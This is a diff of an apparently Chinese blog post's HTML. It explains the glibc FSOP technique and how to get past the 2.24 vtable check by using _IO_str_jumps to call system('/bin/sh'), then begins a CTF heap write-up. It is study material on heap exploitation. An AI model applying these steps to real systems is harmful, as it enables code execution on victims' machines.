0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></li>
+<li>_IO_OVERFLOW<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span><br></code></pre></td></tr></table></figure></li>
+<li>JUMP1<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br></code></pre></td></tr></table></figure></li>
+<li>_IO_JUMPS_FUNC<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_JUMPS_OFFSET</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span><br><span class="hljs-meta">  (IO_validate_vtable                                                   \</span><br><span class="hljs-meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)	\</span><br><span class="hljs-meta">			     + (THIS)-&gt;_vtable_offset)))</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_vtable_offset(THIS) 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li>
 </ul>
 <p>可见在利用vtable跳转表之前先执行了IO_validate_vtable函数，作用是检查vtable是否在glibc的vtable段里</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24\libio\libioP.h</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\libioP.h</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>可见__start___libc_IO_vtables指向第一个vtable _IO_helper_jumps，__stop___libc_IO_vtables指向最后一个vtable _IO_str_chk_jumps的结尾<br>如果还像2.23那样在堆上伪造vtable肯定无法绕过检查，会进入到_IO_vtable_check函数中</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24\libio\vtables.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)<span class="comment">//检查是否是外部重构的vtable</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line"><span class="comment">//检查是否是动态链接库中的vtable</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\vtables.c</span><br><br><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<span class="hljs-comment">//检查是否是外部重构的vtable</span><br>    <span class="hljs-keyword">return</span>;<br><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<br><span class="hljs-comment">//检查是否是动态链接库中的vtable</span><br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>也就是说我们只能以vtable段中的内容为跳板进行利用</p>
 <h4 id="vtable-check绕过"><a href="#vtable-check绕过" class="headerlink" title="vtable check绕过"></a>vtable check绕过</h4><p>利用_IO_str_jumps（也可以利用_IO_wstr_jumps，过程差不多）<br>查看一下_IO_str_jumps：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24\libio\strop.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strop.c</span><br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_str_finish),<br>  JUMP_INIT(overflow, _IO_str_overflow),<br>  JUMP_INIT(underflow, _IO_str_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>  JUMP_INIT(xsputn, _IO_default_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_str_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_default_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure>
 <p>其中有一个finish，实际上执行的函数是_IO_str_finish，其中有一个相对地址的引用</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24\libio\strops.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strops.c</span><br><br><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>我们需要控制：</p>
 <ul>
 <li>fp-&gt;_IO_buf_base&#x3D;bin_sh_addr</li>
@@ -276,273 +314,442 @@
 <li>((_IO_strfile *) fp)-&gt;_s._free_buffer&#x3D;system_addr</li>
 </ul>
 <p>_IO_strfile，这些结构体是嵌套定义的：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24\libio\strfile.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strfile.h</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_strfile_</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_streambuf</span> _<span class="hljs-title">sbf</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_str_fields</span> _<span class="hljs-title">s</span>;</span><br>&#125; _IO_strfile;<br></code></pre></td></tr></table></figure>
 <p>伪造的_IO_strfile长这样</p>
-<img src="/2023/02/20/FSOP/IO_strfile.png" class title="IO_strfile">
+<img src="/2023/02/20/FSOP/IO_strfile.png" srcset="/img/loading.gif" lazyload class title="IO_strfile">
 <p>其中的overflow也有对相对地址的引用，但过程非常复杂，利用起来很不方便</p>
-<h4 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr-&gt;__libc_message-&gt;<span class="built_in">abort</span>-&gt;_IO_flush_all_lockp-&gt;_IO_str_finish</span><br></pre></td></tr></table></figure>
+<h4 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">malloc_printerr-&gt;__libc_message-&gt;<span class="hljs-built_in">abort</span>-&gt;_IO_flush_all_lockp-&gt;_IO_str_finish<br></code></pre></td></tr></table></figure>
 
 <h3 id="2-28以后"><a href="#2-28以后" class="headerlink" title="2.28以后"></a>2.28以后</h3><p>_IO_str_finish中的相对地址引用被free替换，_IO_str_overflow中的相对引用也被malloc和free替换了</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24\libio\strops.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用free替换了相对地址引用</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.24\libio\strops.c</span><br><br><span class="hljs-type">void</span><br>_IO_str_finish (FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br><br><span class="hljs-comment">//用free替换了相对地址引用</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="东华杯2016-pwn450-note（2-23）"><a href="#东华杯2016-pwn450-note（2-23）" class="headerlink" title="东华杯2016-pwn450 note（2.23）"></a>东华杯2016-pwn450 note（2.23）</h3><p>很坐牢也很涨姿势的一道题</p>
 <h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>只能使用一个堆块且无uaf，但edit使用的read_data2函数中存在溢出（只根据’\n’判断读入结束）</p>
-<img src="/2023/02/20/FSOP/read_data.png" class title="read_data">
+<img src="/2023/02/20/FSOP/read_data.png" srcset="/img/loading.gif" lazyload class title="read_data">
 <p>new一个堆块的时候会打印堆块地址</p>
 <h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><h5 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h5><p>申请一个很大的chunk，mmap出来的内存会紧邻libc<br>当top chunk不能满足分配的大小时_int_malloc会调用sysmalloc</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>    alloc_perturb (p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>当要求的大小nb&gt;&#x3D;mp_.mmap_threshold（0x20000）时会调用系统调用mmap分配内存</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">    try_mmap:</span><br><span class="line">      <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">        size = ALIGN_UP (nb + SIZE_SZ, pagesize);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</span><br><span class="line">      tried_mmap = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Don&#x27;t try if size wraps around 0 */</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          mm = (<span class="type">char</span> *) (MMAP (<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));<span class="comment">//系统调用mmap</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>      || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<br>    &#123;<br>      <span class="hljs-type">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br><br>    try_mmap:<br>      <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>        size = ALIGN_UP (nb + SIZE_SZ, pagesize);<br>      <span class="hljs-keyword">else</span><br>        size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);<br>      tried_mmap = <span class="hljs-literal">true</span>;<br><br>      <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>        &#123;<br>          mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<span class="hljs-comment">//系统调用mmap</span><br></code></pre></td></tr></table></figure>
 <p>分配的内存紧邻libc向下延伸（0x7fc3d4bff000）</p>
-<img src="/2023/02/20/FSOP/mmap.png" class title="mmap">
+<img src="/2023/02/20/FSOP/mmap.png" srcset="/img/loading.gif" lazyload class title="mmap">
 <p>mmap的chunk也有0x10的chunk head同时必须保持页对齐，由于程序会打印堆块地址，根据堆块大小和堆块基址我们就能知道libc基址</p>
 <h5 id="创造多个chunk"><a href="#创造多个chunk" class="headerlink" title="创造多个chunk"></a>创造多个chunk</h5><p>要触发unsorted bin attack就必须要能在free的状态下控制chunk，但程序不存在uaf。要通过edit的溢出漏洞实现uaf至少需要两个chunk（一个在bin里，一个in use），如果遵循程序的正常流程，free掉的chunk必然和top chunk合并（只能申请0x210大小以上的chunk，在fastbin的范围外）<br>当top chunk不满足分配要求且要求的size符合一定要求时会free旧的top chunk，旧top chunk会进入unsorted bin<br>当nb&lt;mp_.mmap_threshold（0x20000）且旧top chunk需要满足以下要求</p>
 <ul>
 <li>size&gt;0x20</li>
 <li>pre_inuse&#x3D;1</li>
